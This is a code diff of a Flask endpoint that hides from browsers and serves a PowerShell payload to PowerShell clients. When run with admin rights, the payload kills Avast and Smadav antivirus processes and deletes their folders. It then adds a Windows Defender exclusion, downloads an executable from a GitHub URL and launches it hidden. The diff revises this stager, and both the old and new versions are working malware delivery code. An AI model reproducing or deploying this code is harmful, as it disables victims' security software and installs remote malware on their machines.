@@ -7,23 +7,22 @@ app = Flask(__name__)
 def direct_command():
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # Stealth: Show 404 to browsers
+    # Stealth: 404 for browsers
     if 'mozilla' in user_agent and 'powershell' not in user_agent:
         return Response("Not Found", status=404, mimetype='text/plain')
 
-    # The Payload
     ps_content = """
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
     
-    # 1. Aggressively kill background processes
+    # 1. Kill stubborn processes
     $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
     foreach ($p in $procs) {
-        taskkill /F /IM "$p.exe" /T 2>$null
+        taskkill /F /IM "$p.exe" /T /Device 2>$null
     }
 
-    # 2. Cleanup Target Folders
+    # 2. Cleanup Folders
     $folders = @("C:\\Program Files\\Avast Software", "C:\\Program Files (x86)\\SMADAV", "C:\\Program Files\\SMADAV")
     foreach ($f in $folders) {
         if (Test-Path $f) {
@@ -31,26 +30,30 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
         }
     }
 
-    # 3. HIDDEN DEPLOYMENT: Start a new hidden background process for the download
-    $deployScript = {
-        $path = "$HOME\\client_10.exe"
-        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
-        
-        # Download and Run
-        if (!(Test-Path $path)) {
-            Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $path
-        }
-        if (Test-Path $path) {
-            Start-Process $path -WindowStyle Hidden
-        }
-    }
-
-    # Launch the deployment script in a separate hidden PowerShell window
-    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command & {$deployScript}" -WindowStyle Hidden
+    # 3. Deployment (No new window to avoid 'Access Denied')
+    $path = "$HOME\\client_10.exe"
     
-    Write-Host "[+] Background deployment started hidden." -ForegroundColor Green
+    # Silently add exclusion
+    Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+
+    Write-Host "[+] Fetching components..." -ForegroundColor Cyan
+    try {
+        if (!(Test-Path $path)) {
+            $web = New-Object System.Net.WebClient
+            $web.DownloadFile("https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe", $path)
+        }
+        
+        if (Test-Path $path) {
+            Write-Host "[+] Executing Hidden..." -ForegroundColor Green
+            # Start the EXE hidden without opening a new PowerShell window
+            Start-Process $path -WindowStyle Hidden -ErrorAction SilentlyContinue
+        }
+    } catch {
+        Write-Host "[!] Error during fetch: $_" -ForegroundColor Red
+    }
+    
 } else {
-    Write-Host "--- ERROR: ADMIN RIGHTS REQUIRED ---" -ForegroundColor Red
+    Write-Host "--- ERROR: MUST RUN AS ADMIN ---" -ForegroundColor Red
 }
 """
     return Response(ps_content, mimetype='text/plain')
